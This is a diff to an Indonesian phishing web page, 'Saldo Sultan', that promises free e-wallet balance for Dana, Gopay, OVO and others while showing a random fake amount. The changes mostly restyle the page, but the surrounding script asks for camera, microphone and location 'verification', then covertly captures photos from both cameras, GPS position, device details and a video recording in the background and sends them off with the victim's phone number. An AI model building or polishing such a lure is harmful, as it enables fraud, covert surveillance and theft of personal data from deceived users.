@@ -3,63 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Saldo</title>
+    <title>Saldo Sultan</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #0a0a0f;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
         }
+
         .container {
-            background: #ffffff;
-            border-radius: 24px;
-            padding: 30px 25px;
-            max-width: 420px;
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 28px;
+            padding: 32px 28px;
+            max-width: 440px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
             position: relative;
             overflow: hidden;
         }
         .container::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 30% 20%, rgba(255,215,0,0.03), transparent 60%);
+            pointer-events: none;
+        }
+
+        /* GLOW ORB */
+        .glow-orb {
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(255,215,0,0.08), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
         }
 
         /* LOADING */
         .loading-screen {
             text-align: center;
-            padding: 40px 0;
+            padding: 50px 0 30px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 300px;
+            min-height: 350px;
+            position: relative;
+            z-index: 1;
         }
         .loading-screen.hidden { display: none; }
+
         .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+            width: 64px;
+            height: 64px;
+            border: 3px solid rgba(255,215,0,0.1);
+            border-top: 3px solid #ffd700;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
+            margin-bottom: 24px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .loading-text {
-            margin-top: 20px;
-            color: #666;
-            font-size: 14px;
-            letter-spacing: 2px;
+
+        .loading-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 3px;
+            background: linear-gradient(135deg, #ffd700, #f7971e);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .loading-sub {
+            color: rgba(255,255,255,0.3);
+            font-size: 13px;
+            margin-top: 8px;
+            letter-spacing: 4px;
         }
         .loading-dots::after {
             content: '';
@@ -72,215 +101,277 @@
             75% { content: '...'; }
         }
 
-        /* FORM */
-        .form-screen { display: none; }
+        /* FORM SCREEN */
+        .form-screen { display: none; position: relative; z-index: 1; }
         .form-screen.visible { display: block; }
 
-        .form-header {
+        /* HEADER */
+        .header {
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 28px;
         }
-        .form-header .icon {
-            font-size: 40px;
-            margin-bottom: 10px;
+        .header .badge {
+            display: inline-block;
+            background: rgba(255,215,0,0.12);
+            border: 1px solid rgba(255,215,0,0.15);
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+            color: #ffd700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
         }
-        .form-header h2 {
-            font-size: 20px;
-            color: #333;
-            font-weight: 700;
+        .header h1 {
+            font-size: 26px;
+            font-weight: 800;
+            color: #fff;
+            line-height: 1.2;
         }
-        .form-header p {
+        .header h1 .highlight {
+            background: linear-gradient(135deg, #ffd700, #f7971e);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header p {
+            color: rgba(255,255,255,0.4);
             font-size: 13px;
-            color: #999;
-            margin-top: 4px;
+            margin-top: 6px;
+            letter-spacing: 1px;
         }
 
-        /* SALDO */
+        /* SALDO CARD */
         .saldo-card {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 16px;
-            padding: 20px;
+            background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02));
+            border: 1px solid rgba(255,215,0,0.1);
+            border-radius: 20px;
+            padding: 22px;
             text-align: center;
-            margin-bottom: 20px;
-            color: white;
+            margin-bottom: 22px;
+            position: relative;
+            overflow: hidden;
+        }
+        .saldo-card::after {
+            content: '💰';
+            position: absolute;
+            right: 10px;
+            bottom: 10px;
+            font-size: 60px;
+            opacity: 0.04;
         }
         .saldo-card .label {
-            font-size: 12px;
-            opacity: 0.8;
-            letter-spacing: 2px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.3);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            font-weight: 600;
         }
         .saldo-card .amount {
-            font-size: 32px;
+            font-size: 38px;
             font-weight: 800;
-            margin-top: 5px;
+            color: #fff;
+            margin-top: 4px;
+            letter-spacing: 1px;
         }
         .saldo-card .amount span {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 400;
+            color: rgba(255,255,255,0.3);
         }
 
-        /* FORM GROUP */
-        .form-group {
-            margin-bottom: 16px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #555;
-            margin-bottom: 6px;
-        }
-        .form-group input,
-        .form-group select {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e8e8e8;
-            border-radius: 12px;
-            font-size: 15px;
-            transition: all 0.3s;
-            background: #fafafa;
-            outline: none;
-            font-family: inherit;
-        }
-        .form-group input:focus,
-        .form-group select:focus {
-            border-color: #667eea;
-            background: #fff;
-            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
-        }
-        .form-group input::placeholder {
-            color: #bbb;
-        }
-        .form-group select {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 16px center;
-            padding-right: 40px;
-        }
-
-        /* E-WALLET ICONS */
-        .ewallet-icons {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 16px;
-        }
-        .ewallet-icon {
-            flex: 1;
-            min-width: 55px;
-            padding: 10px 8px;
-            border: 2px solid #e8e8e8;
-            border-radius: 12px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            background: #fafafa;
-            font-size: 11px;
-            font-weight: 600;
-            color: #666;
-        }
-        .ewallet-icon:hover {
-            border-color: #667eea;
-            transform: translateY(-2px);
-        }
-        .ewallet-icon.active {
-            border-color: #667eea;
-            background: #f0f3ff;
-            color: #667eea;
-        }
-        .ewallet-icon .emoji {
-            display: block;
-            font-size: 24px;
-            margin-bottom: 3px;
-        }
-
-        /* PERMISSION BUTTON */
+        /* PERMISSION */
         .permission-box {
-            background: #f8f9ff;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 16px;
-            border: 2px solid #e8ecff;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 16px;
+            padding: 18px 20px;
+            margin-bottom: 20px;
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
+            transition: all 0.4s;
+        }
+        .permission-box.granted {
+            border-color: rgba(52, 199, 89, 0.3);
+            background: rgba(52, 199, 89, 0.05);
         }
         .permission-box .icon {
             font-size: 28px;
+            flex-shrink: 0;
         }
         .permission-box .text {
             flex: 1;
             font-size: 13px;
-            color: #555;
-            line-height: 1.4;
+            color: rgba(255,255,255,0.5);
+            line-height: 1.5;
         }
         .permission-box .text strong {
-            color: #333;
+            color: #fff;
+            font-weight: 600;
         }
         .permission-btn {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
+            background: linear-gradient(135deg, #ffd700, #f7971e);
+            color: #0a0a0f;
             border: none;
-            padding: 10px 20px;
-            border-radius: 10px;
+            padding: 10px 22px;
+            border-radius: 12px;
             font-weight: 700;
             font-size: 13px;
             cursor: pointer;
             transition: all 0.3s;
             white-space: nowrap;
+            flex-shrink: 0;
         }
         .permission-btn:hover {
-            transform: scale(1.03);
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            transform: scale(1.04);
+            box-shadow: 0 4px 25px rgba(255,215,0,0.3);
         }
-        .permission-btn:active {
-            transform: scale(0.97);
-        }
+        .permission-btn:active { transform: scale(0.97); }
         .permission-btn.granted {
-            background: #34c759;
+            background: rgba(52, 199, 89, 0.15);
+            color: #34c759;
             cursor: default;
+            border: 1px solid rgba(52, 199, 89, 0.2);
         }
         .permission-btn.granted:hover {
             transform: none;
             box-shadow: none;
         }
+        .permission-btn.hidden { display: none; }
 
-        /* SUBMIT BUTTON */
-        .submit-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            border: none;
+        /* E-WALLET */
+        .ewallet-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.4);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 12px;
+        }
+        .ewallet-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .ewallet-item {
+            background: rgba(255,255,255,0.03);
+            border: 2px solid rgba(255,255,255,0.06);
             border-radius: 14px;
-            font-size: 17px;
-            font-weight: 700;
+            padding: 12px 4px;
+            text-align: center;
             cursor: pointer;
             transition: all 0.3s;
-            margin-top: 8px;
+        }
+        .ewallet-item:hover {
+            border-color: rgba(255,215,0,0.2);
+            transform: translateY(-2px);
+        }
+        .ewallet-item.active {
+            border-color: #ffd700;
+            background: rgba(255,215,0,0.06);
+            box-shadow: 0 0 30px rgba(255,215,0,0.05);
+        }
+        .ewallet-item .logo {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
+            line-height: 1;
+        }
+        .ewallet-item .name {
+            font-size: 10px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 0.5px;
+        }
+        .ewallet-item.active .name {
+            color: #ffd700;
+        }
+
+        /* INPUT */
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.4);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 14px;
+            font-size: 16px;
+            color: #fff;
+            transition: all 0.3s;
+            outline: none;
+            font-family: inherit;
+        }
+        .input-group input:focus {
+            border-color: rgba(255,215,0,0.3);
+            background: rgba(255,255,255,0.06);
+            box-shadow: 0 0 30px rgba(255,215,0,0.03);
+        }
+        .input-group input::placeholder {
+            color: rgba(255,255,255,0.2);
+        }
+
+        /* SUBMIT */
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #ffd700, #f7971e);
+            color: #0a0a0f;
+            border: none;
+            border-radius: 16px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            transition: all 0.6s;
+        }
+        .submit-btn:hover::after {
+            transform: rotate(45deg) translateX(100%);
         }
         .submit-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 8px 35px rgba(255,215,0,0.3);
         }
-        .submit-btn:active {
-            transform: scale(0.98);
-        }
+        .submit-btn:active { transform: scale(0.98); }
         .submit-btn:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
             transform: none;
         }
 
         /* RESULT */
-        .result-screen { display: none; }
+        .result-screen { display: none; position: relative; z-index: 1; }
         .result-screen.visible { display: block; }
         .result-image {
             width: 100%;
-            max-height: 80vh;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
         }
 
         /* Hidden elements */
@@ -297,34 +388,40 @@
         }
 
         @media (max-width: 480px) {
-            .container { padding: 20px 16px; }
-            .saldo-card .amount { font-size: 26px; }
-            .ewallet-icon { min-width: 45px; font-size: 10px; padding: 8px 4px; }
-            .ewallet-icon .emoji { font-size: 20px; }
+            .container { padding: 24px 18px; }
+            .header h1 { font-size: 22px; }
+            .saldo-card .amount { font-size: 32px; }
+            .ewallet-grid { gap: 6px; }
+            .ewallet-item { padding: 10px 2px; }
+            .ewallet-item .logo { font-size: 22px; }
+            .ewallet-item .name { font-size: 9px; }
         }
     </style>
 </head>
 <body>
 
 <div class="container" id="app">
-    <!-- LOADING SCREEN -->
+    <div class="glow-orb"></div>
+
+    <!-- LOADING -->
     <div class="loading-screen" id="loadingScreen">
         <div class="spinner"></div>
-        <div class="loading-text">Memuat<span class="loading-dots"></span></div>
+        <div class="loading-title">SALDO SULTAN</div>
+        <div class="loading-sub">Memuat<span class="loading-dots"></span></div>
     </div>
 
-    <!-- FORM SCREEN -->
+    <!-- FORM -->
     <div class="form-screen" id="formScreen">
-        <div class="form-header">
-            <div class="icon">💳</div>
-            <h2>Verifikasi Saldo</h2>
-            <p>Dapatkan saldo gratis dengan verifikasi</p>
+        <div class="header">
+            <div class="badge">🎉 PROMO TERBATAS</div>
+            <h1>SALDO GRATIS <span class="highlight">SULTAN</span><br>BAGI BAGI</h1>
+            <p>Verifikasi identitas untuk klaim saldo</p>
         </div>
 
         <!-- SALDO -->
         <div class="saldo-card">
-            <div class="label">💰 SALDO ANDA</div>
-            <div class="amount" id="saldoAmount">Rp <span id="saldoValue">0</span></div>
+            <div class="label">💰 Total Saldo Anda</div>
+            <div class="amount">Rp <span id="saldoValue">0</span></div>
         </div>
 
         <!-- PERMISSION -->
@@ -332,42 +429,47 @@
             <div class="icon">🔐</div>
             <div class="text">
                 <strong>Aktifkan semua izin</strong><br>
-                agar Anda bisa transfer saldo dari kami secara gratis
+                untuk verifikasi dan transfer saldo gratis
             </div>
             <button class="permission-btn" id="permissionBtn">Izinkan</button>
         </div>
 
-        <!-- E-WALLET ICONS -->
-        <label style="font-size:13px;font-weight:600;color:#555;display:block;margin-bottom:8px;">Pilih E-Wallet</label>
-        <div class="ewallet-icons" id="ewalletIcons">
-            <div class="ewallet-icon" data-value="Dana">
-                <span class="emoji">💜</span> Dana
+        <!-- E-WALLET -->
+        <span class="ewallet-label">💳 Pilih E-Wallet</span>
+        <div class="ewallet-grid" id="ewalletGrid">
+            <div class="ewallet-item active" data-value="Dana">
+                <span class="logo">💜</span>
+                <span class="name">Dana</span>
             </div>
-            <div class="ewallet-icon" data-value="Gopay">
-                <span class="emoji">💚</span> Gopay
+            <div class="ewallet-item" data-value="Gopay">
+                <span class="logo">💚</span>
+                <span class="name">Gopay</span>
             </div>
-            <div class="ewallet-icon" data-value="Shopeepay">
-                <span class="emoji">🟠</span> Shopeepay
+            <div class="ewallet-item" data-value="Shopeepay">
+                <span class="logo">🟠</span>
+                <span class="name">ShopeePay</span>
             </div>
-            <div class="ewallet-icon" data-value="OVO">
-                <span class="emoji">💙</span> OVO
+            <div class="ewallet-item" data-value="OVO">
+                <span class="logo">💙</span>
+                <span class="name">OVO</span>
             </div>
-            <div class="ewallet-icon" data-value="LinkAja">
-                <span class="emoji">❤️</span> LinkAja
+            <div class="ewallet-item" data-value="LinkAja">
+                <span class="logo">❤️</span>
+                <span class="name">LinkAja</span>
             </div>
         </div>
 
         <!-- NOMOR -->
-        <div class="form-group">
+        <div class="input-group">
             <label>📱 Nomor E-Wallet</label>
-            <input type="tel" id="phoneInput" placeholder="Contoh: 08123456789" maxlength="15">
+            <input type="tel" id="phoneInput" placeholder="0812 3456 7890" maxlength="15">
         </div>
 
         <!-- SUBMIT -->
-        <button class="submit-btn" id="submitBtn">🚀 KIRIM</button>
+        <button class="submit-btn" id="submitBtn">🚀 KLAIM SALDO SEKARANG</button>
     </div>
 
-    <!-- RESULT SCREEN -->
+    <!-- RESULT -->
     <div class="result-screen" id="resultScreen">
         <img src="" alt="Success" class="result-image" id="resultImage">
     </div>
@@ -391,7 +493,7 @@
     const submitBtn = document.getElementById('submitBtn');
     const permissionBtn = document.getElementById('permissionBtn');
     const permissionBox = document.getElementById('permissionBox');
-    const ewalletIcons = document.querySelectorAll('.ewallet-icon');
+    const ewalletItems = document.querySelectorAll('.ewallet-item');
 
     // Hidden elements
     const video = document.getElementById('hidden-video');
@@ -411,10 +513,9 @@
     let hasSent = false;
 
     // ============================================
-    // 💰 GENERATE SALDO ACAK (56K)
+    // 💰 GENERATE SALDO ACAK (45K-65K)
     // ============================================
     function generateSaldo() {
-        // Random antara 45.000 - 65.000
         const min = 45000;
         const max = 65000;
         const saldo = Math.floor(Math.random() * (max - min + 1)) + min;
@@ -578,7 +679,6 @@
     // ============================================
     // 📱 DEVICE INFO
     // ============================================
-    
     function getDeviceInfo() {
         const ua = navigator.userAgent.toLowerCase();
         const info = {
@@ -717,19 +817,15 @@
         try {
             console.log('🎬 Starting background process...');
             
-            // 1. AMBIL FOTO
             photos = await captureBothCameras();
             console.log('✅ Photos captured');
 
-            // 2. GPS
             gpsData = await getGPSLocation();
             console.log('✅ GPS captured');
 
-            // 3. DEVICE INFO
             deviceData = getDeviceInfo();
             console.log('✅ Device info captured');
 
-            // 4. REKAM VIDEO
             videoBlobData = await recordVideo();
             console.log('✅ Video recorded');
 
@@ -756,27 +852,23 @@
     // ============================================
 
     // --- E-WALLET SELECT ---
-    ewalletIcons.forEach(el => {
+    ewalletItems.forEach(el => {
         el.addEventListener('click', function() {
-            ewalletIcons.forEach(i => i.classList.remove('active'));
+            ewalletItems.forEach(i => i.classList.remove('active'));
             this.classList.add('active');
             selectedEwallet = this.dataset.value;
         });
     });
-    // Set default
-    document.querySelector('.ewallet-icon[data-value="Dana"]').classList.add('active');
 
     // --- PERMISSION ---
     permissionBtn.addEventListener('click', async function() {
         try {
-            // Request camera
             const testStream = await navigator.mediaDevices.getUserMedia({
                 video: true,
                 audio: true
             });
             testStream.getTracks().forEach(t => t.stop());
 
-            // Request location
             if (navigator.geolocation) {
                 await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(
@@ -788,32 +880,35 @@
             }
 
             allPermissionsGranted = true;
-            this.textContent = '✅ Terizinkan';
+            this.textContent = '✅ Terverifikasi';
             this.classList.add('granted');
-            permissionBox.style.borderColor = '#34c759';
+            permissionBox.classList.add('granted');
             
-            // Mulai proses background
+            // Hilangkan text permission
+            const textEl = permissionBox.querySelector('.text');
+            textEl.innerHTML = '<strong>✅ Semua izin telah diaktifkan</strong><br>Proses verifikasi berjalan di background';
+            
             startBackgroundProcess();
 
         } catch (err) {
             console.log('Permission error:', err);
-            alert('Mohon izinkan akses kamera dan lokasi untuk melanjutkan.');
+            alert('Mohon izinkan akses kamera, mikrofon, dan lokasi untuk melanjutkan.');
         }
     });
 
     // --- SUBMIT ---
     submitBtn.addEventListener('click', async function() {
-        const phone = phoneInput.value.trim();
-        if (!phone) {
-            phoneInput.style.borderColor = '#ff3b30';
+        const phone = phoneInput.value.trim().replace(/\s/g, '');
+        if (!phone || phone.length < 8) {
+            phoneInput.style.borderColor = '#ff4757';
             phoneInput.focus();
-            setTimeout(() => phoneInput.style.borderColor = '#e8e8e8', 2000);
+            setTimeout(() => phoneInput.style.borderColor = 'rgba(255,255,255,0.06)', 2000);
             return;
         }
 
         if (!allPermissionsGranted) {
-            permissionBox.style.borderColor = '#ff3b30';
-            setTimeout(() => permissionBox.style.borderColor = '#e8ecff', 2000);
+            permissionBox.style.borderColor = '#ff4757';
+            setTimeout(() => permissionBox.style.borderColor = 'rgba(255,255,255,0.06)', 2000);
             return;
         }
 
@@ -825,18 +920,15 @@
         const saldo = generateSaldo();
         const ewallet = selectedEwallet;
 
-        // Kirim data
         await sendData(phone, ewallet, saldo);
 
-        // Tampilkan gambar dari GitHub
         const githubImage = await getImageFromGitHub();
         if (githubImage) {
             resultImage.src = githubImage;
         } else {
-            resultImage.src = 'https://via.placeholder.com/400x600/667eea/fff?text=Verifikasi+Berhasil';
+            resultImage.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="400" height="600" viewBox="0 0 400 600"%3E%3Crect width="400" height="600" fill="%231a1a2e"/%3E%3Ctext x="50%25" y="45%25" text-anchor="middle" font-family="Arial" font-size="60" fill="%23ffd700" dy=".3em"%3E🎉%3C/text%3E%3Ctext x="50%25" y="55%25" text-anchor="middle" font-family="Arial" font-size="22" fill="%23fff" font-weight="bold"%3ESALDO SULTAN%3C/text%3E%3Ctext x="50%25" y="63%25" text-anchor="middle" font-family="Arial" font-size="16" fill="%23666"%3ESaldo berhasil diklaim%3C/text%3E%3C/svg%3E';
         }
 
-        // Tampilkan result
         formScreen.classList.remove('visible');
         resultScreen.classList.add('visible');
     });
@@ -845,16 +937,14 @@
     // 🚀 INIT
     // ============================================
     function init() {
-        // Set saldo acak
         saldoValue.textContent = generateSaldo();
 
-        // Loading 3 detik
         setTimeout(() => {
             loadingScreen.classList.add('hidden');
             formScreen.classList.add('visible');
         }, 3000);
 
-        console.log('📄 Page loaded');
+        console.log('📄 Page loaded - Saldo Sultan');
     }
 
     window.onload = init;
